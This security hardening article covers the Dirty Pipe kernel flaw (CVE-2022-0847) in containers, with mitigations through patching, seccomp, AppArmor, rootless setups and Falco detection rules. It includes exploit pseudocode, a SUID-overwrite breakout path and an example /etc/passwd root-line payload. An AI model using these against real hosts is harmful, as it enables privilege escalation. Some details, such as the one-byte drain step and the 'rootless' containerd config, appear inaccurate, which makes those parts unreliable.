---
title: "Dirty Pipe (CVE-2022-0847): Writing to Read-Only Files Inside Containers"
description: "CVE-2022-0847 let any unprivileged process splice data into read-only file-backed pages via the pipe buffer's PIPE_BUF_FLAG_CAN_MERGE flag. Inside a container, this means overwriting the host's read-only binaries and /etc/passwd without any special capabilities."
slug: dirty-pipe-container-escape
date: 2026-05-08
lastmod: 2026-05-08
category: linux
tags:
  - cve
  - container-escape
  - kernel
  - privilege-escalation
  - linux
personas:
  - security-engineer
  - platform-engineer
article_number: 689
difficulty: Advanced
estimated_reading_time: 14
published: true
layout: article.njk
permalink: /articles/linux/dirty-pipe-container-escape/
---

# Dirty Pipe (CVE-2022-0847): Writing to Read-Only Files Inside Containers

## The Problem

CVE-2022-0847 was disclosed by Max Kellermann on March 7, 2022. He found it while debugging a data corruption issue affecting customer log files — the kind of investigation that starts mundane and ends with a full write primitive into read-only kernel memory. The vulnerability exists in the Linux pipe buffer implementation and affects kernel versions 5.8 through 5.16.10, 5.15.24, and 5.10.101. Fixed versions are 5.16.11, 5.15.25, and 5.10.102.

The name is a deliberate echo of Dirty COW (CVE-2016-5195), but the mechanism is distinct and in some ways more dangerous. Dirty COW required a race condition. Dirty Pipe does not. It is deterministic, reliable, and requires no capabilities whatsoever.

### The Pipe Buffer and PIPE_BUF_FLAG_CAN_MERGE

To understand the vulnerability, you need to understand how the kernel handles pipe writes. When a process writes to a pipe, the kernel stores the data in a ring of `pipe_buffer` structures. Each buffer entry describes a page of memory and a set of flags. One of those flags is `PIPE_BUF_FLAG_CAN_MERGE`, introduced in kernel 5.8 as part of the splice/zero-copy optimisation work. When this flag is set on the most recent buffer entry, a subsequent write to the pipe does not allocate a new page — it appends (merges) the new data into the existing page in place.

The flag is supposed to be cleared under certain conditions. Specifically, when a buffer entry is populated via `splice()` from a file-backed mapping, the `PIPE_BUF_FLAG_CAN_MERGE` flag must not be set, because the underlying page is owned by the page cache and may be mapped read-only. The bug: the flag was not being cleared reliably when pipe buffer entries were initialised from splice paths. Under the right sequence of operations, `PIPE_BUF_FLAG_CAN_MERGE` remained set on a buffer entry that was backed by a read-only page cache page.

A subsequent `write()` to the pipe then merges data directly into that page cache page, bypassing the VFS permission checks entirely. The kernel never re-checks whether the page is writable — it trusts the flag. The result is an arbitrary write primitive into any file-backed read-only page that can be spliced into a pipe.

### The Exploitation Sequence

The exploit is six steps. No privileges required. No race condition.

```c
// Dirty Pipe exploitation sequence — PoC pseudocode
// Target: overwrite bytes at offset `offset` in read-only file `path`
// with content from `payload` of length `payload_len`

int fd = open(path, O_RDONLY);   // (1) open the target read-only

int pipe_fds[2];
pipe(pipe_fds);                  // (2) create a pipe

// (3) Fill the pipe buffer to the brim so the kernel has allocated
//     pages and set PIPE_BUF_FLAG_CAN_MERGE on all buffer entries.
//     Pipe capacity defaults to 65536 bytes (16 pages on x86-64).
char fill[65536];
memset(fill, 0, sizeof(fill));
write(pipe_fds[1], fill, sizeof(fill));

// (4) Drain exactly one byte, creating a partial buffer entry.
//     The PIPE_BUF_FLAG_CAN_MERGE flag is still set on this entry.
char drain[1];
read(pipe_fds[0], drain, 1);

// (5) Splice from the target file into the pipe at the desired offset.
//     The splice populates the next buffer entry with the page cache
//     page backing `offset` in `fd` — but because we drained one byte,
//     the last buffer entry still has CAN_MERGE set.
//     The splice path fails to clear the flag on the incoming page.
loff_t off = offset & ~(PAGE_SIZE - 1);  // align to page boundary
splice(fd, &off, pipe_fds[1], NULL, 1, 0);

// (6) Write the payload. The kernel sees CAN_MERGE on the last buffer
//     entry and merges the write directly into the page cache page
//     that backs the read-only file. The write succeeds with ENOSPC
//     never triggering because the page is already allocated.
write(pipe_fds[1], payload, payload_len);

// At this point, the bytes at `offset` in `path` have been modified
// in the page cache. Any subsequent read of that file returns the
// poisoned bytes. The modification is NOT flushed to disk — it lives
// in the page cache until the page is evicted or the system reboots.
// For attack purposes, page cache persistence is sufficient.
```

The `offset` parameter must point to at least one byte past the start of the page — you cannot overwrite byte 0 of a page-aligned file. In practice this is not a meaningful constraint; most interesting targets (SUID binaries, `/etc/passwd`, shared libraries) have writable regions well past page boundaries.

Working public exploits appeared within hours of the disclosure. The `cm4all` PoC from Kellermann's own repository, and the subsequent polished versions targeting SUID binary overwrite, were widely reproduced and required no modification to run on unpatched kernels.

### Why This Breaks Container Isolation

A container process operates in a separate mount namespace, PID namespace, and user namespace, but it shares the host kernel's page cache. The page cache is not namespaced. When a container reads `/etc/passwd` from a bind-mounted host volume, it accesses the same page cache entries that the host kernel uses. When the Dirty Pipe exploit writes into those entries, it is writing into the host's view of the file.

This is not a container runtime bug. It is a kernel bug. Docker, containerd, and CRI-O are all equally affected because they all run on the same kernel and cannot sandbox the page cache at a per-container level.

The `readOnly: true` field in a Kubernetes volume mount translates to a `MS_RDONLY` flag in the kernel's VFS layer. It prevents open-and-write operations from succeeding through the normal file write path. It has no effect on Dirty Pipe because the exploit bypasses the VFS write path entirely — it uses the pipe write path, which checks the `PIPE_BUF_FLAG_CAN_MERGE` flag rather than file permissions.

## Threat Model

**Unprivileged container process with no capabilities gets an arbitrary write into host page cache.** A process running as uid 1000 inside a container, with `CAP_NET_ADMIN`, `CAP_SYS_ADMIN`, and every other capability dropped, can overwrite the host's `/etc/passwd`, `/etc/shadow`, and any SUID binary accessible through a bind mount or shared overlay layer, as long as the host kernel is in the vulnerable range.

**Attack surface.** Any file descriptor that is readable from within the container and is backed by the host page cache is a target. This includes:

- Files from bind mounts (host directories mounted into the container) even when mounted `readOnly: true`
- Files from overlay filesystem layers — the lower layers of the container image that the container runtime constructs are all page-cache-backed, and they are read-only by design, which is precisely what Dirty Pipe bypasses
- Host SUID binaries that appear in the container's filesystem namespace via the overlay lower layer: `/usr/bin/sudo`, `/usr/bin/newuidmap`, `/usr/bin/newgidmap`, `/usr/bin/pkexec`

**Container breakout path via SUID binary overwrite.** The concrete breakout sequence against a running container on an unpatched host:

1. From inside the container, identify a SUID binary in the overlay lower layer — the binary exists on the host and its page cache pages are shared
2. Overwrite the binary's executable payload bytes with a shellcode stub that forks, drops a root shell payload, and re-executes the original binary to avoid detection
3. Execute the binary from the container; because it has SUID set and the SUID bit is still intact (only the code bytes were modified, not the inode), the kernel executes it with the host root effective UID
4. The shellcode runs as root in the host's mount namespace, not the container's

This is exploitable even when the pod spec has `allowPrivilegeEscalation: false` and all capabilities dropped, because the kernel's `execve` SUID handling occurs before any seccomp profile takes effect on the new process image.

**`readOnly: true` does not protect you.** This is worth repeating. The Kubernetes pod spec:

```yaml
volumeMounts:
  - name: host-etc
    mountPath: /etc
    readOnly: true
```

sets `MS_RDONLY` on the bind mount. Dirty Pipe does not call `write()` on the file descriptor. It calls `write()` on a pipe. The kernel's pipe write code checks `PIPE_BUF_FLAG_CAN_MERGE` and then writes into the page, not into the file. `MS_RDONLY` is never consulted.

**Kernel version gating.** The `PIPE_BUF_FLAG_CAN_MERGE` flag was introduced in kernel 5.8 (August 2020). Kernels below 5.8 do not have this code path and are not vulnerable. Kernels 5.8 through 5.16.10, 5.15.24, and 5.10.101 are vulnerable. The practical consequence for container environments in early 2022: Ubuntu 20.04 LTS with the HWE kernel (which tracks 5.13+), Ubuntu 21.10, Debian 11 with a backport kernel, and any distribution that had updated past 5.8 were all in the vulnerable range. Ubuntu 20.04 with the GA kernel (5.4) was not vulnerable. RHEL 8 and 9 backported the relevant code and ship their own patched kernels; the CVE was addressed in RHEL errata RHSA-2022:0718 and RHSA-2022:0722.

## Hardening Configuration

### 1. Patch Verification

The first and most important action is confirming whether the running kernel is patched.

```bash
uname -r
# Patched versions by series:
#   5.16.11 or later (mainline)
#   5.15.25 or later (stable)
#   5.10.102 or later (longterm)
# Kernels below 5.8 are not vulnerable.

# On Debian/Ubuntu, check the installed package version:
apt-cache policy linux-image-$(uname -r) | grep Installed

# On RHEL/CentOS, check for the errata:
rpm -q --changelog kernel | grep -i "CVE-2022-0847" | head -3

# A fast fleet-wide check via a one-liner against /proc/version:
python3 -c "
import platform
v = tuple(int(x) for x in platform.release().split('-')[0].split('.'))
if v < (5, 8):
    print('NOT VULNERABLE (pre-5.8)')
elif v >= (5, 16, 11):
    print('PATCHED')
elif v >= (5, 15, 25) and v[0:2] == (5, 15):
    print('PATCHED')
elif v >= (5, 10, 102) and v[0:2] == (5, 10):
    print('PATCHED')
else:
    print('VULNERABLE:', platform.release())
"
```

### 2. Seccomp Profile Blocking splice() and tee()

The Dirty Pipe exploit requires `splice()`. Blocking `splice()` via a seccomp profile prevents the exploit from succeeding even on an unpatched kernel. The `tee()` syscall is a related zero-copy primitive that operates on pipe-to-pipe data duplication and should be blocked alongside `splice()`.

Create the seccomp profile JSON at `/var/lib/kubelet/seccomp/profiles/block-splice.json`:

```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_AARCH64",
    "SCMP_ARCH_ARM"
  ],
  "syscalls": [
    {
      "names": ["splice", "tee", "vmsplice"],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 38
    }
  ]
}
```

`errnoRet: 38` is `ENOSYS` — the syscall does not exist. An attacker's PoC checking return codes will see a clean failure rather than `EPERM`, which reduces the signal that a seccomp policy is active. `vmsplice()` is included because it can be used to move data from userspace into a pipe buffer and is part of the same splice family.

Apply it to a Kubernetes pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-workload
  namespace: production
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/block-splice.json
    runAsNonRoot: true
    runAsUser: 1000
  containers:
    - name: app
      image: myapp:1.4.2
      securityContext:
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
        readOnlyRootFilesystem: true
```

The kubelet must have `--seccomp-profile-root` pointing to `/var/lib/kubelet/seccomp` (the default). Verify the profile is loaded:

```bash
# On the node, confirm the file is present:
ls -la /var/lib/kubelet/seccomp/profiles/block-splice.json

# Confirm the pod is using it:
kubectl get pod hardened-workload -o jsonpath='{.spec.securityContext.seccompProfile}'
# {"localhostProfile":"profiles/block-splice.json","type":"Localhost"}
```

For Docker, apply the profile at run time:

```bash
docker run \
  --security-opt seccomp=/etc/docker/seccomp/block-splice.json \
  --cap-drop ALL \
  --read-only \
  myapp:1.4.2
```

**Trade-off: what uses splice().** The `splice()` syscall is used by some legitimate I/O paths:

- `rsync` with certain flags uses `splice()` for zero-copy file transfer
- `sendfile()` wrappers and HTTP servers (nginx uses `sendfile`, which is a different syscall — not affected)
- `ffmpeg` and media processing tools that move data between file descriptors without copying through userspace
- `kafka-go` and some other Go networking libraries on specific code paths

Before deploying this profile to a production workload, run the workload under `strace -e trace=splice,tee,vmsplice` and confirm these syscalls are not present in normal operation:

```bash
strace -f -e trace=splice,tee,vmsplice -p $(pgrep -f myapp) 2>&1 | head -20
# If no output: safe to block
# If splice() appears: investigate which codepath and whether it can be disabled
```

### 3. AppArmor Confinement for Sensitive Host Paths

AppArmor cannot block the exploit mechanism directly (the write goes through the pipe, not through a file path), but it can deny the container from opening host-side SUID binaries and sensitive configuration files that would be useful targets. Add deny rules to the container's AppArmor profile:

```
# /etc/apparmor.d/containers/docker-hardened
#include <tunables/global>

profile docker-hardened flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Allow normal container operation
  file,
  network,
  capability,
  mount,

  # Deny opening host-side sensitive paths that should not be
  # read or spliced by container processes.
  deny /etc/passwd w,
  deny /etc/shadow rw,
  deny /etc/sudoers rw,
  deny /usr/bin/sudo rw,
  deny /usr/bin/newuidmap rw,
  deny /usr/bin/newgidmap rw,
  deny /usr/bin/pkexec rw,
  deny /usr/lib/*/ld-*.so* w,
}
```

Load and enforce the profile:

```bash
apparmor_parser -r -W /etc/apparmor.d/containers/docker-hardened
aa-status | grep docker-hardened
# docker-hardened (enforce)
```

Attach it to a Docker container:

```bash
docker run \
  --security-opt apparmor=docker-hardened \
  myapp:1.4.2
```

The limitation here is precise: AppArmor denies the `open()` call with write intent. The Dirty Pipe exploit only needs `O_RDONLY` on the target file. The deny rules above block write opens, but the actual page cache corruption happens through the pipe, which AppArmor does not mediate at the page level. The value of these rules is in reducing the attack surface for _other_ exploit techniques and for blocking follow-on writes after privilege escalation.

### 4. Rootless Containers and User Namespace Remapping

Rootless container configurations use user namespace UID mapping to run the container's apparent root (uid 0) as an unprivileged host UID. This does not prevent Dirty Pipe from writing into the page cache, but it substantially limits what can be achieved with that write.

Consider overwriting `/usr/bin/newuidmap`, which is SUID root and owned by root. From a rootless container where uid 0 maps to host uid 100000, the exploit can write into the page cache copy of that binary, but when the container process executes the modified binary, the kernel's SUID handling checks whether the file owner (root, uid 0) has execute permission and sets the effective uid to 0 — host uid 0. So rootless remapping does not fully prevent the SUID overwrite path if the binary is root-owned and SUID.

However, for files owned by specific users that the container process maps to, rootless remapping does limit the blast radius. Overwriting a file owned by host uid 100000 is possible, but overwriting files owned by host uid 0 and exploiting SUID bits still works.

Configure rootless Podman with automatic UID mapping:

```bash
# Run a container with automatic UID remapping
podman run --userns=auto myapp:1.4.2

# Verify the mapping in use
podman inspect <container-id> | jq '.[0].HostConfig.UsernsMode'
# "auto"

# Check the actual uid mapping
cat /proc/$(pgrep -f myapp)/uid_map
# 0    100000    65536
# Container uid 0 -> host uid 100000, range of 65536 uids
```

For containerd with rootless configuration, edit `/etc/containerd/config.toml`:

```toml
[plugins."io.containerd.grpc.v1.cri".containerd]
  snapshotter = "overlayfs"

[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
  SystemdCgroup = true

# Enable rootless mode with uid mapping
[plugins."io.containerd.grpc.v1.cri"]
  disable_tcp_service_discovery = true

[plugins."io.containerd.snapshots.v1.overlayfs"]
  root_path = "/var/lib/containerd/io.containerd.snapshots.v1.overlayfs"
```

For Kubernetes, enable user namespace support in the kubelet (alpha in 1.25, beta in 1.28):

```yaml
# Pod spec with user namespace enabled
apiVersion: v1
kind: Pod
metadata:
  name: userns-pod
spec:
  hostUsers: false    # Enable user namespace remapping for this pod
  containers:
    - name: app
      image: myapp:1.4.2
      securityContext:
        runAsUser: 1000
        runAsNonRoot: true
```

### 5. Falco Detection Rule

Falco instruments kernel syscalls via eBPF or kernel module and can detect suspicious `splice()` calls from container contexts targeting sensitive file paths. The rule fires when a process inside a container calls `splice()` or `vmsplice()` and has recently opened files in sensitive host-mounted paths.

```yaml
# /etc/falco/rules.d/dirty-pipe.yaml

- rule: Dirty Pipe Exploit Attempt
  desc: >
    Detects splice/vmsplice syscalls from a container context that may indicate
    a CVE-2022-0847 (Dirty Pipe) exploitation attempt. Fires when a container
    process calls splice() after opening a sensitive file read-only — the
    exact sequence required by the exploit.
  condition: >
    (evt.type = splice or evt.type = vmsplice)
    and container.id != host
    and (
      fd.name startswith /etc/passwd
      or fd.name startswith /etc/shadow
      or fd.name startswith /usr/bin/sudo
      or fd.name startswith /usr/bin/newuidmap
      or fd.name startswith /usr/bin/newgidmap
      or fd.name startswith /usr/bin/pkexec
      or fd.name startswith /usr/lib
      or fd.name startswith /usr/sbin
    )
  output: >
    Possible Dirty Pipe exploit: splice/vmsplice from container on sensitive path
    (evt=%evt.type container=%container.name image=%container.image.repository
    pid=%proc.pid user=%user.name fd=%fd.name cmdline=%proc.cmdline
    parent=%proc.pname)
  priority: CRITICAL
  tags: [CVE-2022-0847, container, filesystem, exploit-attempt]

- rule: Pipe Write to Read-Only Mount Path
  desc: >
    A container process is writing to a pipe after splicing from a path that
    is mounted read-only in the pod spec. This matches the Dirty Pipe pattern
    of using the pipe as an indirect write vector.
  condition: >
    evt.type = write
    and container.id != host
    and proc.name != runc
    and fd.type = pipe
    and evt.arg.count > 0
    and (
      proc.cmdline contains /etc/passwd
      or proc.cmdline contains /usr/bin/sudo
    )
  output: >
    Pipe write after read-only file open in container
    (container=%container.name image=%container.image.repository
    pid=%proc.pid user=%user.name cmdline=%proc.cmdline)
  priority: WARNING
  tags: [CVE-2022-0847, container, pipe, filesystem]
```

Deploy the rules and reload Falco:

```bash
# Copy rules to the rules directory
cp dirty-pipe.yaml /etc/falco/rules.d/

# Validate the rules syntax
falco --validate /etc/falco/rules.d/dirty-pipe.yaml

# Reload without restart (Falco 0.33+)
kill -USR1 $(pgrep falco)

# Or restart the service
systemctl restart falco

# Confirm rules are loaded
falco --list | grep -i "dirty pipe\|splice"
```

## Expected Behaviour

On a patched kernel (5.16.11+, 5.15.25+, or 5.10.102+), running the PoC exploit produces a clean failure. The `splice()` call succeeds — it is not the vulnerable step — but the subsequent `write()` to the pipe no longer merges into the read-only page cache page. The kernel correctly treats the page as unwritable and the write either writes into a new page (not affecting the file) or returns `EPERM`:

```bash
# On a patched system, running the exploit PoC:
$ ./dirty-pipe-exploit /etc/passwd 1 "root::0:0:root:/root:/bin/sh"
[-] write to pipe returned -1: EPERM
# Or on some patched versions:
[-] pipe write did not modify target file (page cache unaffected)
```

With the seccomp profile blocking `splice()`, the exploit fails at step 5 before it can set up the page cache reference:

```bash
$ ./dirty-pipe-exploit /etc/passwd 1 "root::0:0:root:/root:/bin/sh"
[-] splice returned -1: ENOSYS
```

In the audit log, the seccomp block produces:

```
type=SECCOMP msg=audit(1715126400.441:8832): auid=1000 uid=1000 gid=1000 \
  ses=4 subj=unconfined pid=12047 comm="dirty-pipe" exe="/tmp/dirty-pipe" \
  sig=0 arch=c000003e syscall=275 compat=0 ip=0x7f8b3c12a4e1 code=0x50000
```

Syscall 275 is `splice` on x86-64. `code=0x50000` is `SECCOMP_RET_ERRNO`.

When Falco is running and the rules are active, a genuine exploit attempt from a container triggers the critical alert:

```
14:32:07.882341872: Critical Possible Dirty Pipe exploit: splice/vmsplice from
container on sensitive path (evt=splice container=webapp-6d9f8b7c4-xkp2q
image=myapp pid=38471 user=nobody fd=/etc/passwd
cmdline=dirty-pipe /etc/passwd 1 root::0:0:root:/root:/bin/sh
parent=bash)
```

On Falco with JSON output enabled, this feeds directly into SIEM pipelines and can trigger automated quarantine of the container via a Falco response plugin or a webhook to the container runtime's API.

## Trade-offs

**Patching.** There is no meaningful trade-off here. Patch the kernel. The only real constraint is environments that cannot reboot — bare-metal production systems in industries where maintenance windows are rare, or systems running real-time workloads that preclude kernel live migration. For those environments, the seccomp and detection controls below are the primary mitigations during the window before the next reboot is possible. Kernel live patching (kpatch, kGraft, Canonical Livepatch) is the correct solution for no-reboot environments; patches for CVE-2022-0847 were available within days of disclosure from major vendors.

**Blocking splice() via seccomp.** The `splice()` syscall exists for a reason. Zero-copy pipe-based I/O is meaningfully faster for large data transfers. Workloads that are genuinely I/O-bound and use splice for performance — high-throughput log shipping, media transcode pipelines, some database WAL transfer implementations — will see a performance regression if splice is blocked. Quantify this before deploying: run the workload under `perf stat -e syscalls:sys_enter_splice` and check the call rate. For most web application containers, splice call rates are zero and the profile has no performance impact. For I/O pipelines, evaluate whether the kernel is already patched and the seccomp profile is therefore a defence-in-depth measure rather than a primary control.

**Rootless containers and UID remapping.** User namespace remapping breaks workloads that require real uid 0 on the host — workloads that mount specific host paths and need to own those paths, workloads that use `CAP_SYS_ADMIN` for network namespace manipulation, and some storage CSI drivers. It also complicates image builds and some CI patterns. The protection it provides against Dirty Pipe is partial at best (SUID root binaries are still overwritable). Use rootless containers where the workload supports it, but do not treat it as the primary Dirty Pipe mitigation.

**Falco alerting.** The splice-based Falco rule will generate false positives from any legitimate tool inside a container that calls splice — rsync with `--inplace`, certain database backup tools, and anything that uses `sendfile` via a splice-based libc wrapper. Tune the rule with a `not (proc.name in (rsync, ....))` exception list for known-clean callers. The false positive rate is workload-dependent. Start with the rule in `WARNING` priority and promote to `CRITICAL` after a week of baseline data.

## Failure Modes

**Assuming `readOnly: true` in the pod spec protects against this.** It does not, and this is the most dangerous misconception about Dirty Pipe in container environments. The `readOnly: true` flag sets `MS_RDONLY` on the bind mount, which prevents `open(path, O_WRONLY)` from succeeding. The exploit opens the file `O_RDONLY`. The write goes through the pipe, not through the file descriptor. The VFS read-only enforcement is bypassed entirely. Teams that audited their pod specs for `readOnly: true` and considered themselves protected were not protected.

**Relying on container runtime isolation.** Docker, containerd, and CRI-O all implement container isolation at the namespace and cgroup layer. None of them namespace the page cache. The page cache is a kernel data structure that all processes on the host share, regardless of which container they are in. A kernel vulnerability that writes into the page cache is not something any container runtime can mitigate at the runtime level. This applies to the entire class of kernel page cache vulnerabilities, not just Dirty Pipe.

**Not testing seccomp profiles against actual workload syscall usage before deploying.** A seccomp profile that breaks a production workload is a reliability incident. The failure mode is: deploy block-splice profile to a workload that uses rsync for backup, rsync silently starts failing or logging errors, on-call engineer adds `SCMP_ACT_ALLOW` for splice to unblock rsync, the profile now has a hole. The correct process is baseline the workload with `strace -e trace=splice,tee,vmsplice` before deploying the profile, not after.

**Kernel version pinning without tracking upstream security patches.** Some teams pin specific kernel versions for stability and only update on a defined schedule. When that schedule is quarterly, a kernel vulnerability with public exploits available on day zero can go unpatched for 90 days. Dirty Pipe had working container escape exploits within 48 hours of disclosure. Kernel version tracking needs to account for critical security patches outside the normal update schedule. Configure monitoring that alerts when a running kernel falls more than N days behind the latest security patch for its series.

**Treating the overlay lower layers as safe from page cache attacks.** Container image layers are read-only by design — the overlay filesystem's lower layers are mounted read-only to support copy-on-write semantics. Teams sometimes assume this makes them safe from modification. The page cache backing those overlay lower layers is writable via Dirty Pipe from any process that can open a file from those layers, including container processes that are supposed to see them as read-only. The overlay filesystem's read-only enforcement is VFS-layer enforcement, and Dirty Pipe bypasses VFS-layer enforcement.

## Related Articles

- [Linux Kernel Hardening](/articles/linux/kernel-module-hardening/)
- [Seccomp BPF Without Containers](/articles/linux/seccomp-bpf-non-container/)
- [Linux algif_aead Privilege Escalation (CVE-2026-31431)](/articles/linux/linux-algif-aead-privilege-escalation/)
- [eBPF LSM](/articles/linux/ebpf-lsm/)
- [Linux Kernel Live Patching](/articles/linux/kernel-live-patching/)
- [AppArmor Hardening](/articles/linux/apparmor/)
